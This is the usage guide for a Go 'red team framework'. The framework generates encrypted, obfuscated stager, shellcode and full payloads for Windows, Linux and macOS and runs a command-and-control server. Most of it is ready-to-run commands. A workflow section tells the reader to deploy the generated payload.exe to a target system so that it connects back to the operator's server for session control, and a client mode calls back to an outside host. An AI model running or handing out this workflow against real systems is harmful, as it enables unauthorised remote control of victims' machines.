# CLI Usage Guide - Red Team Framework

**Date**: 2025-01-27  
**Status**: ✅ Ready to Use

---

## Quick Answer

**You can use CLI directly - no make required!**

The framework supports three modes:
1. **`generate`** - Generate payloads via CLI
2. **`server`** - Start C2 server
3. **`client`** - Connect as client

---

## CLI Generation (No Make Required)

### Basic Usage

```bash
# Generate a payload directly via CLI
go run main.go --mode generate \
    --payload stager \
    --os windows \
    --arch amd64 \
    --output payload.exe \
    --encrypt \
    --obfuscate

# Or build first, then use binary
make build
./bin/redteam-framework --mode generate --payload stager --os windows --arch amd64
```

### Available CLI Flags

```bash
# Mode selection
--mode <server|client|generate>    # Operation mode (default: server)

# Generation options
--payload <stager|shellcode|full>  # Payload type (default: stager)
--os <linux|windows|darwin>       # Target OS (default: linux)
--arch <amd64|386|arm64>          # Target architecture (default: amd64)
--output <path>                   # Output file path (default: auto-generated)
--encrypt                          # Enable encryption (default: true)
--obfuscate                        # Enable obfuscation (default: true)

# Server options
--listen <host:port>               # Server listen address (default: 0.0.0.0:8443)
--config <path>                    # Configuration file path

# Client options
--callback <url>                   # Callback URL for client mode

# General options
--debug                            # Enable debug logging
--version                          # Show version information
```

---

## Examples

### 1. Generate Windows Stager Payload

```bash
go run main.go --mode generate \
    --payload stager \
    --os windows \
    --arch amd64 \
    --output windows_stager.exe \
    --encrypt \
    --obfuscate
```

### 2. Generate Linux Shellcode

```bash
go run main.go --mode generate \
    --payload shellcode \
    --os linux \
    --arch amd64 \
    --output linux_shellcode.bin
```

### 3. Generate Full macOS Payload

```bash
go run main.go --mode generate \
    --payload full \
    --os darwin \
    --arch amd64 \
    --output macos_full.bin \
    --encrypt \
    --obfuscate
```

### 4. Start Server

```bash
# Start C2 server
go run main.go --mode server \
    --listen 0.0.0.0:8443 \
    --debug

# Or with config file
go run main.go --mode server \
    --config config.json \
    --listen 0.0.0.0:8443
```

### 5. Connect as Client

```bash
go run main.go --mode client \
    --callback https://your-server.com:8443
```

---

## Makefile Commands (Optional)

The Makefile provides convenience commands for building:

```bash
# Build binary
make build

# Build for specific platforms
make build-windows    # Windows executable
make build-linux      # Linux executable
make build-darwin     # macOS executable
make build-all        # All platforms

# Clean build artifacts
make clean

# Run tests
make test

# Install to $GOPATH/bin
make install
```

**Note**: Make is **optional**. You can use `go run` or `go build` directly.

---

## Build vs Run

### Option 1: Run Directly (No Build Required)

```bash
# Generate payload
go run main.go --mode generate --payload stager --os windows

# Start server
go run main.go --mode server

# Connect client
go run main.go --mode client --callback https://server.com:8443
```

### Option 2: Build First (Faster)

```bash
# Build binary
make build
# or
go build -o bin/redteam-framework .

# Use binary
./bin/redteam-framework --mode generate --payload stager --os windows
./bin/redteam-framework --mode server
./bin/redteam-framework --mode client --callback https://server.com:8443
```

### Option 3: Install to PATH

```bash
# Install globally
make install
# or
go install .

# Use from anywhere
redteam-framework --mode generate --payload stager --os windows
```

---

## Complete Workflow Example

### Step 1: Generate Payload

```bash
go run main.go --mode generate \
    --payload stager \
    --os windows \
    --arch amd64 \
    --output payload.exe \
    --encrypt \
    --obfuscate \
    --debug
```

**Output**: `payload.exe` will be created

### Step 2: Start Server

```bash
go run main.go --mode server \
    --listen 0.0.0.0:8443 \
    --debug
```

**Output**: Server starts listening on port 8443

### Step 3: Deploy Payload

Deploy `payload.exe` to target system. It will connect back to your server.

### Step 4: Interact with Session

Use the server interface to interact with connected sessions.

---

## Advanced Usage

### Cross-Compilation

```bash
# Build for Windows from Linux
GOOS=windows GOARCH=amd64 go build -o payload.exe .

# Build for Linux from Windows
GOOS=linux GOARCH=amd64 go build -o payload.bin .

# Build for macOS from Linux
GOOS=darwin GOARCH=amd64 go build -o payload.bin .
```

### Custom Configuration

```bash
# Generate with custom config
go run main.go --mode generate \
    --config myconfig.json \
    --payload full \
    --os windows
```

### Debug Mode

```bash
# Enable verbose logging
go run main.go --mode generate \
    --payload stager \
    --os windows \
    --debug
```

---

## Help Command

```bash
# Show help
go run main.go --help

# Show version
go run main.go --version
```

---

## Summary

✅ **You can use CLI directly** - No make required  
✅ **`go run main.go --mode generate`** - Works immediately  
✅ **Makefile is optional** - Convenience only  
✅ **Three modes available** - generate, server, client  

**Recommended Workflow**:
1. Use `go run` for quick testing
2. Use `make build` for production binaries
3. Use `make install` for global installation

---

## Troubleshooting

### "Command not found"
```bash
# Make sure you're in the project directory
cd redteam-framework

# Or use full path
go run /path/to/redteam-framework/main.go --mode generate
```

### "Permission denied"
```bash
# Make executable
chmod +x bin/redteam-framework

# Or use go run
go run main.go --mode generate
```

### "Build errors"
```bash
# Clean and rebuild
make clean
make build

# Or check dependencies
go mod tidy
go build .
```

---

## Next Steps

1. **Generate your first payload**: `go run main.go --mode generate --payload stager --os windows`
2. **Start the server**: `go run main.go --mode server`
3. **Test the connection**: Deploy payload and verify connection

**Everything works via CLI - no make required!** ✅

